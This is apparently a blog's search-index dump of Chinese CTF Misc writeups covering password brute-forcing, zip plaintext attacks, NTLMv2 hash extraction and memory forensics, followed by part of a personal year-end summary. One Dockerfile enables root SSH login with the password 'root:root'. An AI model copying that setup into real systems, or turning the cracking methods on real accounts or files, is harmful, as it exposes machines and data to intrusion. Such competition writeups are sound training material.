qIf4cqAnAmtonP","date":"2025-04-19","objectID":"/posts/f002407/:0:0","tags":["CTF","Misc","Writeup"],"title":"2025 西湖论剑·中国杭州网络安全技能大赛 Misc Writeup","uri":"/posts/f002407/"},{"categories":["Writeup"],"content":"2025 XCTF国际网络攻防联赛-SUCTF分站赛 Misc Writeup 题目附件下载：https://pan.baidu.com/s/12xlTPFG1QJ9OWIM_f4lKbA?pwd=s44r 提取码: s44r 题目名称 SU_checkin 附件给了一个流量包，用过滤器过滤一下，发现只有流50的返回值是200 从上面的流量包中可以得到一下几个关键信息，密文、密钥以及加密算法 java.-jar.suctf-0.0.1-SNAPSHOT.jar.–password=SePassWordLen23SUCT algorithm=PBEWithMD5AndDES OUTPUT=ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg= 但是仔细观察SePassWordLen23SUCT，发现密钥是不完整的并且提示了密钥长度是23 因此参考Github上这个PBEWithMD5AndDES解密脚本，爆破一下密钥即可 https://github.com/binsgit/PBEWithMD5AndDES/blob/master/python/PBEWithMD5AndDES_2.py import base64 import hashlib import re import os from Crypto.Cipher import DES from string import printable import itertools def get_derived_key(password, salt, count): key = password + salt for i in range(count): m = hashlib.md5(key) key = m.digest() return (key[:8], key[8:]) def decrypt(msg, password): msg_bytes = base64.b64decode(msg) salt = msg_bytes[:8] enc_text = msg_bytes[8:] (dk, iv) = get_derived_key(password, salt, 1000) crypter = DES.new(dk, DES.MODE_CBC, iv) text = crypter.decrypt(enc_text) # print(text) return text def encrypt(msg, password): salt = os.urandom(8) pad_num = 8 - (len(msg) % 8) for i in range(pad_num): msg += chr(pad_num) (dk, iv) = get_derived_key(password, salt, 1000) crypter = DES.new(dk, DES.MODE_CBC, iv) enc_text = crypter.encrypt(msg) return base64.b64encode(salt + enc_text) def main(): table = printable[:62] for a, b, c in itertools.product(table, repeat=3): passwd = \"SePassWordLen23SUCTF{}{}{}\".format(a, b, c) print(passwd) s = \"ElV+bGCnJYHVR8m23GLhprTGY0gHi/tNXBkGBtQusB/zs0uIHHoXMJoYd6oSOoKuFWmAHYrxkbg=\" res = decrypt(s, passwd) # print(res) if \"SUCTF\" in res: print(passwd,res) break if __name__ == \"__main__\": main() python2运行以上脚本即可得到密钥和flag：SePassWordLen23SUCTF666 SUCTF{338dbe11-e9f6-4e46-b1e5-eca84fb6af3f} 题目名称 SU_RealCheckin 给了个对应表，对应的字母其实就是emoji英文的首字母 hello ctf -\u003e 🏠🦅🍋🍋🍊 🐈🌮🍟 $flag -\u003e 🐍☂️🐈🌮🍟{🐋🦅🍋🐈🍊🏔️🦅🌮🍊🐍☂️🐈🌮🍟🧶🍊☂️🐈🍎🌃🌈🦅🍎🍋🍋🧶🐬🍎🌃🐈🦅} 签到题，写脚本其实没有手搓快。。。 flag = \"🐍☂🐈🌮🍟{🐋🦅🍋🐈🍊🏔️🦅_🌮🍊_🐍☂️🐈🌮🍟_🧶🍊☂️_🐈🍎🌃_🌈🦅🍎🍋🍋🧶_🐬🍎🌃🐈🦅}\" dic = { '🏠':'h', '🦅':'e', '🍋':'l', '🍊':'o', '🐈':'c', '🌮':'t', '🍟':'f', '🐍':'s', '☂️':'u', '🐋':'w', '🏔️':'m', '🧶':'y', '🌈':'r', '🌃':'n', '🍎':'a', '🐬':'d' } for item in flag: if item == '_' or item == '{' or item == '}': print(item,end='') else: try: print(dic[item],end='') except: print(\" \",end='') # s ctf{welco e_to_s ctf_yo _can_really_dance} # suctf{welcome_to_suctf_you_can_really_dance} 题目名称 SU_forensics 狗and猫师傅出的题，整体思路是挺好的，质量也很高，就是最后一步的字频爆破，不给提示还是难以联想 题面信息如下： bkfish在自己的虚拟机里运行了某些命令之后用\"sudo reboot\"重启了主机，接着他按照网上清除入侵记录的方法先\"rm -rf .bash_history\"然后\"history -c\"删除了所有的命令记录。在现实世界中，消失的东西就找不回来了，但在网络世界里可未必如此，你能找到bkfish消失的秘密吗? flag提交格式：全大写的SUCTF{XXXX} 附件直接给了Vmware虚拟机的所有文件，Vmware可以直接打开.vmx文件 但是进入系统需要密码，系统版本是Ubuntu14.04LTS 可以直接用DiskGenius挂载vmdx虚拟磁盘文件 然后尝试使用DiskGenius的恢复数据功能，可以恢复出被删除的.bash_history .bash_history内容如下 echo “My secret has disappeared from this space and time, and you will never be able to find it.” curl -s -o /dev/null https://www.cnblogs.com/cuisha12138/p/18631364 sudo reboot 访问里面那个博客园的链接，发现已经被删除了，但是我们可以尝试去网站时光机上找一找 网站时光机的链接：https://web.archive.org/ 这篇被删除的文章的链接：https://web.archive.org/web/20241225122922/https://www.cnblogs.com/cuisha12138/p/18631364 文章中的图片提示了我们一个Github的仓库：https://github.com/testtttsu/homework 并且通过提高图片的亮度和对比度我们可以得到解压密码：2phxMo8iUE2bAVvdsBwZ 我们访问上面的那个Github仓库，发现这个分支已经被删除了 但是我们可以从旁边的activity中找到这个被删除的文件 然后填上之前得到的解压密码，用仓库中的脚本直接运行即可得到下面这张图片 写了个脚本来分割图片，并统计每种符号出现的次数 from PIL import Image import hashlib import os def crop_table(): if os.path.exists(\"out\"): print(\"[+] out 目录已存在\") else: os.mkdir(\"out\") print(\"[+] out 目录创建成功\") img = Image.open(\"1.png\") width, height = img.size # 9522, 1296 print(f\"图片尺寸: {width}x{height}\") crop_width = 137 crop_height = 107 cols = (width - 0) // crop_width rows = (height - 0) // crop_height print(f\"可分割的列数: {cols}, 行数: {rows}\") index = 1 for row in range(rows): for col in range(cols): # 计算裁剪区域的坐标 left = 0 + col * (crop_width + 1) upper = 0 + row * (crop_height + 1) right = left + crop_width lower = upper + crop_height","date":"2025-04-01","objectID":"/posts/754b8e7/:0:0","tags":["CTF","Misc","Writeup"],"title":"2025 XCTF国际网络攻防联赛-SUCTF分站赛 Misc Writeup","uri":"/posts/754b8e7/"},{"categories":["Writeup"],"content":"这比赛虽然有些Misc题比较搞心态，但是不得不说题目质量还是在的 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 ezflag 打开流量包，发现直接传输了一个zip压缩包 因此我们直接把原始的Hex复制到cyberchef中 然后选择 From Hex 然后下载转换后的压缩包即可 Tips: 这里不推荐用CyberChef的magic功能，要不然转出来的压缩包会提示已损坏 易损坏的压缩包，需要我们自己去修复文件目录区和文件目录结束区 其实就是多了一位的错误数据 压缩包解压后可以得到一个flag.zip，010查看发现是一张png图片，改后缀为png即可得到flag flag{140c7366-c217-4039-af6a-d36c4591a4c8} 题目名称 PvZ 解压题目给的压缩包，得到一个名为 key is md5(price) 的文件夹和一个加密的压缩包 文件夹里有一个txt和一张图片，内容如下 李华的梦想是攒钱买毁灭菇加农炮，可是他总攒不住钱，请帮他理财，算一下他刚开始的这局游戏花了多少钱 很明显地提示了压缩包的解压密码，但是让我算是不可能算的，直接写个脚本生成一下MD5，然后爆破即可 import hashlib res = '' for i in range(10000): res += hashlib.md5(str(i).encode()).hexdigest() + '\\n' with open(\"dic.txt\",'w') as f: f.write(res) 爆破得到压缩包解压密码：217eedd1ba8c592db97d0dbe54c7adfc 解压后可以得到如下两张图片 用PS的透视裁剪工具调整图片，然后把前面那个角和三个定位块补上就能得到一张二维码 识别二维码得到如下内容 D'`_q^K![YG{VDTveRc10qpnJ+*)G!~f1{d@-}v\u003c)9xqYonsrqj0hPlkdcb(`Hd]#a`_A@VzZY;Qu8NMqKPONGkK-,BGF?cCBA@\"\u003e76Z:321U54-21*Non,+*#G'\u0026%$d\"y?w_uzsr8vunVrk1ongOe+ihgfeG]#[ZY^W\\UZSwWVUNrRQ3IHGLEiCBAFE\u003e=aA:9\u003e765:981Uvu-2+O/.nm+$Hi'~}|B\"!~}|u]s9qYonsrqj0hmlkjc)gIedcb[!YX]\\UZSwWVUN6LpP2HMFEDhHG@dDCBA:^!~\u003c;:921U/u3,+*Non\u0026%*)('\u0026}C{cy?}|{zs[q7unVl2ponmleMib(fHG]b[Z~k 这个时候回头去看图片的名字：M41b0lg3.png 把M41b0lg3转换为malbolge，上网一搜发现是一种编程语言，直接在线网站运行即可得到flag flag{5108a32f-1c7f-4a40-a4fa-fd8982e6eb49} 题目名称 Find way to read video 解压题目附件给的压缩包，得到一个bonan7654.txt，内容如下 bonan7654 has put his email template on a public platform. 然后就是要找bonan7654在哪个平台上发东西了，比赛的时候，社工这个人把我心态都搞崩了 国内外各大平台都搜了就是搜不到，赛后才知道是在gitcode上发的【无语】 唉，还是见的东西太少了，通过这次比赛也是让我知道了还有gitcode这个东西。。 下载这个项目中的README.md，发现是垃圾邮件隐写(spammimic)，找个在线网站解密一下 decode后得到如下内容： BV1wm2EY2Egx eyJ2IjozLCJuIjoiZjE0ZyIsInMiOiIiLCJoIjoiZjczZDEyZCIsIm0iOjkwLCJrIjo4MSwibWciOjIwMCwia2ciOjEzMCwibCI6NDMsInNsIjoxLCJmaGwiOlsiMjUyZjEwYyIsImFjYWM4NmMiLCJjYTk3ODExIiwiY2QwYWE5OCIsIjAyMWZiNTkiLCIyYzYyNDIzIiwiNGUwNzQwOCIsIjRlMDc0MDgiLCJjYTk3ODExIiwiMmU3ZDJjMCIsIjZiODZiMjciLCIzZjc5YmI3IiwiNGUwNzQwOCIsIjM5NzNlMDIiLCJkNDczNWUzIiwiNGIyMjc3NyIsIjc5MDI2OTkiLCJlN2Y2YzAxIiwiMzk3M2UwMiIsIjRiMjI3NzciLCI0YjIyNzc3IiwiNmI4NmIyNyIsIjJlN2QyYzAiLCIzOTczZTAyIiwiY2E5NzgxMSIsIjNmNzliYjciLCI0ZTA3NDA4IiwiZDQ3MzVlMyIsIjM5NzNlMDIiLCIzZjc5YmI3IiwiM2Y3OWJiNyIsIjI1MmYxMGMiLCIzZjc5YmI3IiwiNmI4NmIyNyIsIjE4YWMzZTciLCI1ZmVjZWI2IiwiNGUwNzQwOCIsIjE4YWMzZTciLCIxOGFjM2U3IiwiMTk1ODFlMiIsIjNmNzliYjciLCJkMTBiMzZhIiwiMDFiYTQ3MSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNmUzNDBiOSIsIjZlMzQwYjkiLCI2ZTM0MGI5IiwiNzdhZGZjOSIsImRlN2QxYjciLCI0NGJkN2FlIiwiYmI3MjA4YiIsIjgzODkxZDciLCIyYTBhYjczIiwiZmUxZGNkMyIsIjU1OWFlYWQiLCJmMDMxZWZhIl19 CyberChef解base64可以得到一个json 在赛后参考了别的师傅的wp后，知道这里处理这段json有两种方法 解法一：根据题目名获取video 根据题目名字的提示：Find way to read video 可以猜测这段json与video有关，观察到原来那段base64数据前有一段BV开头的字符串：BV1wm2EY2Egx 搜索这个字符串可以在B站上找到下面这个视频，视频标题：ZjE0Zw== base64解码后可以得到 fl4g 因此，猜测需要从这些视频里提取flag 首先，我们需要批量下载这90个视频到本地，爬虫大佬可以自己写脚本爬，这里我就偷懒直接借助插件了 油猴插件直接安装这个脚本，然后本地需要先打开 Aria2 备用 然后刷新b站视频界面，可以在屏幕左侧看到脚本已启用 然后勾上所有的视频，选择 AriaNgGUI 下载即可 我们直接播放视频可以看到前面有几帧是条纹的干扰画面，因此将视频下载到本地后，我们可以先尝试用以下代码分离视频中的所有帧 def video2imgs(video_path,imgs_dir): # 分离视频中的所有帧 cap = cv2.VideoCapture(video_path) if not cap.isOpened(): print(f\"[-] 视频读取失败\") return frames_num = cap.get(7) print(f\"[+] 视频读取成功，总帧数为 {frames_num}\") if not os.path.exists(imgs_dir): os.mkdir(imgs_dir) frame_cnt = 1 while True: ret,frame = cap.read() if not ret: break img_name = imgs_dir+f\"{frame_cnt}.png\" cv2.imwrite(img_name,frame) print(f\"[+] 视频第 {frame_cnt} 帧保存成功\") frame_cnt += 1 cap.release() print(f\"[+] 视频 {video_path.split('/')[-1]} 所有帧已读取完毕\") 分离出来后可以发现前四帧和最后四帧是干扰项，然后查看后面的图片可以明显看到图像上方有白色的原点，猜测隐写了内容 因此我们尝试提取图像中的的像素，因为所有白色的像素都在第一行，因此我们先分析第一行的225个像素 def extract_flag(video_path): # 使用cv2读取视频 cap = cv2.VideoCap","date":"2025-03-29","objectID":"/posts/de8e2be/:0:0","tags":["CTF","Misc","Writeup"],"title":"2024 强网拟态防御国际精英挑战赛初赛 Misc Writeup","uri":"/posts/de8e2be/"},{"categories":["Writeup"],"content":"2024 网鼎杯网络安全大赛青龙组 Misc Writeup 本文中涉及的具体题目附件可以进我的知识星球获取 题目名称 Misc01 题目附件给了一个MME.cap流量包，wireshark打开查看 附件名字中的MME（Mobility Management Entity）表示移动性管理实体 发现流量包中的协议主要有：DIAMETER、S1AP/NAS-EPS、GTPv2、S1AP 问一问GPT，发现 DIAMETER、GTPv2 是比较可能的方向 因此我们配合过滤器一个个查看流量包，最终在DIAMETER协议中发现关键信息MME-Location-Information 最后把该字段中的值MD5加密一下即可得到flag：wdflag{1f717538aeec1322f446a754d0bcf220} 题目名称 Misc02(赛后复现) 题目附件给了一个未知后缀的flag文件，strings 查看一下发现是Ubuntu22.04的内存镜像 这里我先尝试了制作vol3的symbols，但是做完后发现也扫不出东西 如何制作vol3的符号文件可以参考我的这篇博客以及这个项目 我这里还是写了一个Dockerfile来制作符号文件 把 linux-image-unsigned-6.5.0-41-generic-dbgsym_6.5.0-41.41~22.04.2_amd64.ddeb 和 dwarf2json-linux-amd64 放 src 目录中即可 ddeb的下载链接：http://launchpadlibrarian.net/733303944/linux-image-unsigned-6.5.0-41-generic-dbgsym_6.5.0-41.41~22.04.2_amd64.ddeb FROM ubuntu:22.04 # 将环境设置为非交互环境 ENV DEBIAN_FRONTEND=noninteractive COPY ./src/ /src/ RUN sed -i 's/archive.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.list \\ \u0026\u0026 sed -i 's/security.ubuntu.com/mirrors.ustc.edu.cn/g' /etc/apt/sources.list \\ \u0026\u0026 apt update --no-install-recommends\\ \u0026\u0026 apt install -y openssh-server gcc-10 dwarfdump build-essential unzip kmod linux-base linux-image-6.5.0-41-generic\\ \u0026\u0026 mkdir /app \\ \u0026\u0026 sed -i 's/\\#PermitRootLogin prohibit-password/PermitRootLogin yes/g' /etc/ssh/sshd_config \\ \u0026\u0026 sed -i 's/\\#PasswordAuthentication yes/PasswordAuthentication yes/g' /etc/ssh/sshd_config \\ \u0026\u0026 echo 'root:root' | chpasswd \\ \u0026\u0026 systemctl enable ssh \\ \u0026\u0026 service ssh start WORKDIR /src # 这里的文件名需要根据系统版本进行修改 COPY ./src/linux-image-unsigned-6.5.0-41-generic-dbgsym_6.5.0-41.41~22.04.2_amd64.ddeb linux-image-unsigned-6.5.0-41-generic-dbgsym_6.5.0-41.41~22.04.2_amd64.ddeb RUN dpkg -i linux-image-unsigned-6.5.0-41-generic-dbgsym_6.5.0-41.41~22.04.2_amd64.ddeb \\ \u0026\u0026 chmod +x dwarf2json-linux-amd64 \\ # 下面这里的文件名需要根据系统版本进行修改 \u0026\u0026 ./dwarf2json-linux-amd64 linux --elf /usr/lib/debug/boot/vmlinux-6.5.0-41-generic \u003e linux-image-6.5.0-41-generic.json CMD [\"/bin/bash\"] 符号文件在Docker中制作好后直接SSH连上容器下载到本地 然后放到 volatility3/volatility3/framework/symbols/linux/ 目录下即可 docker build --tag symbols . docker run -p 2022:22 -it symbols /bin/sh service ssh start 做完符号文件后发现也扫不出东西，因此这道题我这里就直接打算用010手动提取了 首先，我们先用strings看看用户桌面上有什么东西，当然这里也可以直接在010中搜字符串 strings flag | grep Desktop 我们确定了用户名以及桌面的路径，便于我们缩小范围，过滤掉无效的干扰数据 strings flag | grep /home/ccc/Desktop/ 可以看到扫出来了很多非常关键的信息，桌面上有很多张PNG图片，然后还有同名的TXT文件 甚至还有内存镜像的vol3符号文件以及制作符号文件的工具（所以我猜测出题人是故意让我们没办法用vol3进行取证） 然后我们到010中搜索那几张图片的文件名 发现用了base64 xxx.png \u003e xxx.txt这个命令，把图片数据以base64编码的格式保存到同名txt文件中 猜测另外几个文件也是同理，因此我们根据PNG的文件头base64编码后的值：iVBORw0KGgo 在010中可以定位到12个位置 依次查看，发现里面有好多个位置表示的都是同一张图片 手动提取出Hex数据，注意这里建议提取Hex数据，直接提取右边的字符串可能会有问题（可能有不可打印字符） 69 56 42 4F 52 77 30 4B 47 67 6F 41 41 41 41 4E 53 55 68 45 55 67 41 41 41 51 41 41 41 41 45 41 43 41 49 41 41 41 44 54 45 44 38 78 41 41 41 43 76 55 6C 45 51 56 52 34 6E 4F 33 54 4D 51 45 41 49 41 7A 41 4D 4D 43 2F 35 79 46 6A 52 78 4D 46 66 58 70 6E 35 6B 44 56 32 77 36 41 54 51 59 67 7A 51 43 6B 47 59 41 30 41 35 42 6D 41 4E 49 4D 51 4A 6F 42 53 44 4D 41 61 51 59 67 7A 51 43 6B 47 59 41 30 41 35 42 6D 41 4E 49 4D 51 4A 6F 42 53 44 4D 41 61 51 59 67 7A 51 43 6B 47 59 41 30 41 35 42 6D 41 4E 49 4D 51 4A 6F 42 53 44 4D 41 61 51 59 67 7A 51 43 6B 47 59 41 30 41 35 42 6D 41 4E 49 4D 51 4A 6F 42 53 44 4D 41 61 51 59 67 7A 51 43 6B 47 59 41 30 41 35 42 6D 41 4E 49 4D 51 4A 6F 42 53 44 4D 41 61 51 59 67 7A 51 43 6B 47 59 41 30 41 35 42 6D 41 4E 49 4D 51 4A 6F 42 53 44 4D 41 61 51 59 67 7A 51 43 6B 47 59 41 30 41 35 42 6D 41 4E 49 4D 51 4A 6F 42 53 44 4D 41 61 51 59 67 7A 51 43 6B 47 59 41 30 41 35 42 6D 41 4E 49 4D 51 4A 6F 42 53 44 4D 41 61 51 59 67 7A 51 43 6B 47 59 41 30 41 35 42 6D 41 4E 49 4D 51 4A 6F 42 53 44 4D 41 61 51 59 67 7A 51 43 6B 47 59 41 30 41 35 42 6D 41 4E 49 4D 51 4A 6F 42 53 44 4D 41 61 51 59 67 7A 51 43 6B 47 59 41 30 41 35 42 6D 41 4E 49 4D 51 4A 6F 42 53 44 4D 41 61 51 59 67 7A 51 43 6B 47 59 41 30 41 35 42 6D 41 4E 49 4D 51 4A 6F 42 53 44 4D 41 61 51 59 67 7A 51 43 6B 47 59 41 30 41 35 42 6D 41 4E 49 4D 51 4A 6F 42 53 44 4D 41 6","date":"2025-03-27","objectID":"/posts/1a285be/:0:0","tags":["CTF","Misc","Writeup"],"title":"2024 网鼎杯网络安全大赛青龙组 Misc Writeup","uri":"/posts/1a285be/"},{"categories":["Writeup"],"content":"2024 浙江省大学生网络与信息安全竞赛 Misc Writeup 本文中涉及的具体题目附件可以进我的知识星球获取 初赛 题目名称 签到题2 题目给了如下密文 6L\u003cAk3,*@VM*\u003e7U\u0026FZFNWc,Ib=t,X!+,BnSDfoaNhdiO*][5F];eV^]Lm\u0026?$'\u003coeGH\u00266tqcgK_JDp-3;8wh?Si,G$BarTFjE?b$eR/,Igij\u003c({u90M$5If589[\u003c4+jp%3_%R(526#1J|m5p\u0026H+%.#d0\u003cDmLK*#-\\8w:xD2Y[3jO{l8[)\u003c(F[=Bcixb\u003eJp^%L2XvVTzW@9OTko/P74d1sFscEbMO7Vhp\u0026HM;+ww/v[KM1%2M*7O\\}rEZM.LM0'\\iwK:])pg-nJef\\Rt4 先尝试用basecrack梭一把 basecrack可以得到如下密文 5C9VB8W09FG6DC9LX6J1A3T9ZY9P7BKG6+M9B1AO7BI%6OTAZY91G60Z9%IBG09NIBNB9TB9 然后放到CyberChef中 From base45 + From base32 即可得到flag：DASCTF{welcome_to_zjctf_2024} 当然这里也可以直接在CyberChef中一个个尝试（要求CyberChef的版本要比较新） 题目名称 RealSignin 解压附件压缩包，得到一张out.png 直接使用zsteg一把梭，可以得到一串编码和一个表，猜测是换表的base64 因此直接把两个东西复制到CyberChef中解码即可得到flag：DASCTF{We1C0me_2_ZJCTF2024!} 题目名称 机密文档 解压附件压缩包，得到一个加密的机密文档.zip 里面有一个the_secret_you_never_ever_know_hahahaha.zip，文件名很长并且还是用的Store压缩方法 因此我们猜测考察的是压缩包的明文攻击，压缩包考点的详细讲解可以看我的这篇博客 直接使用bkcrack进行明文攻击可以得到三段密钥，然后用密钥修改压缩包密码即可 解压压缩包后得到the_secret_you_never_ever_know_hahahaha.docm 打开文件发现存在宏代码，因此我们尝试使用olevba提取宏代码 olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools =============================================================================== FILE: .\\the_secret_you_never_ever_know_hahahaha.docm Type: OpenXML WARNING For now, VBA stomping cannot be detected for files in memory ------------------------------------------------------------------------------- VBA MACRO ThisDocument.cls in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument' - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - (empty macro) ------------------------------------------------------------------------------- VBA MACRO NewMacros.bas in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros' - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - Sub key() Dim decValues As Variant Dim str As String Dim result As String Dim i As Integer Dim xorValue As Integer decValues = Array(26, 25, 28, 0, 16, 1, 74, 75, 45, 29, 19, 49, 61, 60, 3) str = \"outguess\" result = \"\" For i = LBound(decValues) To UBound(decValues) xorValue = decValues(i) Xor Asc(Mid(str, (i Mod Len(str)) + 1, 1)) result = result \u0026 Chr(xorValue) Next i End Sub +----------+--------------------+---------------------------------------------+ |Type |Keyword |Description | +----------+--------------------+---------------------------------------------+ |Suspicious|Chr |May attempt to obfuscate specific strings | | | |(use option --deobf to deobfuscate) | |Suspicious|Xor |May attempt to obfuscate specific strings | | | |(use option --deobf to deobfuscate) | |Suspicious|Base64 Strings |Base64-encoded strings were detected, may be | | | |used to obfuscate strings (option --decode to| | | |see all) | +----------+--------------------+---------------------------------------------+ 发现就是一个简单的异或，因此我们可以使用CyberChef或者自己写个脚本解出密钥：ulhged98BhgVHYp 这里我脚本里给出了两种方法 from pwn import xor data = [26, 25, 28, 0, 16, 1, 74, 75, 45, 29, 19, 49, 61, 60, 3] str = \"outguess\" res = [] def func1(): key = xor(data,str) print(key.decode()) def func2(): for i in range(len(data)): tmp = data[i] ^ ord(str[i%(len(str))]) res.append(chr(tmp)) print(''.join(res)) if __name__ == \"__main__\": func1() # ulhged98BhgVHYp func2() # ulhged98BhgVHYp 这里的str提示了outguess，因此猜测这里就是图片的outguess隐写 把the_secret_you_never_ever_know_hahahaha.docm后缀改为zip并解压 在the_secret_you_never_ever_know_hahahaha\\word\\media目录下得到image1.jpeg 直接使用之前得到的密钥outguess解密即可得到flag：DASCTF{B1g_S3CR3t_F0R_Y0u} tips：这里会报错未知的数据类型，我们直接把后缀改成jpg即可正常解密 题目名称 EZtraffic 解压附件压缩包，得到一个pcapng文件，翻看流量包发现主要是SMB流量 追踪流发现传输了压缩包，因此我们直接使用Wireshark导出传输的压缩包即可 这里导出的时候要注意，选择那个100%的压缩包导出，另外两个压缩包是不完整的 在导出的压缩包注释中发现提示：NTLM v2 plaintext + \\d{5} 因此猜测需要我们提取 NTLMv2 哈希值并破解密码，详细的步骤可以看我的这篇博客 最后组合得到的hash如下 rockyou::MicrosoftAccount:4936df20962cae6d:db12ced50faf52f141636e80205e8f28:01010000000000003604281b951fdb017b4045aa008508eb0000000002001e00440042004500440036004200350041002d0035003100430032002d00340001001e00440042004500440036004200350041002d0035003100430032002d003400040048006400620065006400360062","date":"2025-03-26","objectID":"/posts/c216d58/:0:0","tags":["CTF","Misc","Writeup"],"title":"2024 浙江省大学生网络与信息安全竞赛 Misc Writeup","uri":"/posts/c216d58/"},{"categories":["年终总结"],"content":"自己这一年也是真的经历了好多事，也算是忙碌而充实的一年吧 很早就有写年终总结的想法，无奈文笔退化地实在太烂 最后也是终于断断续续地写完了这篇年终总结 感觉自己真正突然开始忙起来应该是在2023年9月，就是从大三上那个学期，那这篇年终总结就从那时候开始说起吧 九月 蓝帽杯(上海) 2023年9月16号，放弃教师资格证的笔试（浪费了210块钱，可恶），去上海参加了蓝帽杯的半决赛 这真的是最舒服的一次线下赛，因为那时候你浙师还是啥比赛都可以报销，然后也玩的很开心，想念温德姆~ 虽然因为某些不可抗力因素导致没晋级全国总决赛（比赛打到一半突然断电。。并且Web还是需要侧信道爆破的题目） 那时候和队友确实因为这个遗憾难过了好久，因为没晋级总决赛就去不了北京了(T_T) 但是我们的另一支队伍成功晋级了，然后他们之后去北京参加了总决赛，虽然因为决赛的赛制是渗透而导致成绩一般 十月 GEEKCON2024 China(上海) 2023年10月24号，我和实验室的小伙伴们(@Fu1p1p、@LegendChen)凌晨3点坐着绿皮火车摇到上海（因为没法报销，需要自费） 然后一到上海就去参加了GEEKCON 2023 China，这也是我第一次参加这种大型的网络安全线下技术论坛 虽然疫情刚刚结束那会儿我去杭州参加了DEFCON GROUP 0571，但是那个规模和等级远比不上这次的GeekCon 在这次的活动上，很幸运的见到了之前心目中的偶像，XCTF联赛的联合创始人——清华网研院的诸葛建伟老师 并且很幸运的拿到了和诸葛建伟老师合照的机会（老师人真的很和善，而且还记得2017年来过浙师做讲座 十一月 浙江省赛 2023年11月11号，A1natas的七支队伍一起去嘉兴的商飞基地参加了第六届浙江省网安竞赛 然后本人也是终于在这次的省赛上拿到了省一等奖，也算是完成了一个期待已久愿望吧，感谢队友(@AsaL1n、@Straw) 十一月 台州市赛 2023年11月17日，我们学校的两支队伍去台州科技职业学院参加了台州市赛，这也是我们第一次参与线下AWD赛制的比赛 那时候正逢期中考，本来都打算不去了，但是后来咨询了楼老师(老师人真的很好)，发现奖金挺丰厚的 于是我们两支队伍就分别派了两位同学去参赛，并且为了节省经费，我们就决定当天往返(在温州南站转的车) 因为我们之前都没有怎么接触过AWD赛制，所以取得成绩并不是很理想(三等奖-2000元的奖金) 虽然但是，我们那一队就去了我(Misc手)和Straw(Re手)，而且比赛就两道Web题，这次是真的把Misc手当Web手使了 十一月 证券投资浙江省赛(浙江·杭州) 2023年11月25号，我和同学一起去浙江财经大学参加了证券投资省赛的线下陈述和答辩 并且靠着线上实测的高收益和线下答辩的良好发挥，拿下了省一等奖，收益率全省第一，总分全省第四的好成绩 这也是我第一次参加经管类的比赛，前期代码和文本修改然后还有线下答辩答辩稿的准备也是花了挺多的时间 （依稀记得凌晨三点还在改那个训练模型和交易的代码。。。 元旦 上海跨年 2023的跨年夜和对象一起去了上海，还得是魔都，外滩上人山人海 然后也是刚刚好在2024年的第一刻，海底捞排队排到了，有幸成为了那家店2024年接待的第一桌客人 尽管是跨年的深夜，但是海底捞的服务员依旧充满热情，面带笑容地接待我们 元旦那天，和对象一起去了上海的欢乐谷，但是欢乐谷似乎没有限制接待人数，导致后来晚上的时候人满为患 当时在人潮中就害怕发生类似于泰梨园的踩踏事件，所以一直催促着赶紧离开 对象拍的烟花美的有些恍惚，同时这也是俩人冒着生命危险一起看的2024年的第一场烟花 一月 生日 也是除了父母外，第一次有人给我买生日蛋糕，然后为我筹办生日 也是本人第一次吃到海盐味(咸)的生日蛋糕哈哈哈 二月 广州 潮汕 南澳 过完年，趁着寒假还没结束，和对象一起去广东玩了一周，不得的不说广州是真的挺好玩的 首先是去了陈家祠和沙面那边，感觉那边的氛围真的很好，路边开满了鲜花，感觉非常的适合养老 然后我们一起去了长隆野生动物园，看到了很多动物，尤其是坐观光车的环节，可以非常近距离的观赏动物们 离开了广州后，我们一起坐着大巴，穿过跨海大桥去了南澳 南澳岛上的花是真的很好看！尤其是刚下跨海大桥即将进岛的那段路上，两旁都是簇拥着的鲜花 南澳最让我印象深刻的还是可以租小电驴环岛，然后那个小电驴最快可以开到45码， 小电驴的续航也足够用，我们连续开了两天，大概开了有一百多公里吧，电量也没消耗多少 和对象两个人骑着小电驴打卡了北回归线标志塔还有好几座灯塔 然后在过程中也偶遇了一些小小的海湾，听着海浪打击岸边石头的声音，感觉自己内心都被洗涤了 最后的那天晚上我们去吃了海鲜大排档，虽然那个分量确实没有温州的大。。 但是很幸运那天晚上刚刚好遇到了南澳后宅镇的游神活动，满街都是鞭炮和烟花，大家也纷纷从家里走到街上 六月 国赛华东南(福建·福州) 这场比赛可能是本人入坑CTF以来打过的最折磨人的比赛了 六月底的福州就像一个大火炉，然后承办学校也是不做人，把我们参赛选手安排到一个没有空调的篮球馆中 虽然后来临时加装了空调和电风扇，但是并没有什么用，甚至比赛打到一半风扇还被别人转走了 比赛过程中也是真的汗流浃背，电脑发热到键盘都烫手，中途去洗脸，发现洗脸的水都是咸的了(汗已经变成盐粒。。 不过好在最后的结果是好的，队友的输出也是十分给力，因此A1natas也顺利晋级了后面的全国总决赛 虽然这场比赛的体验着实难受，但是在赛后我们吃了一顿非常丰盛的晚饭，福州这趟也不算白来哈哈 七月 国赛全国总决赛(四川·成都) 到了成都当然少不了吃火锅，我们还特意点了九宫格，当然最后那个辣度我也是吃不了一点。。 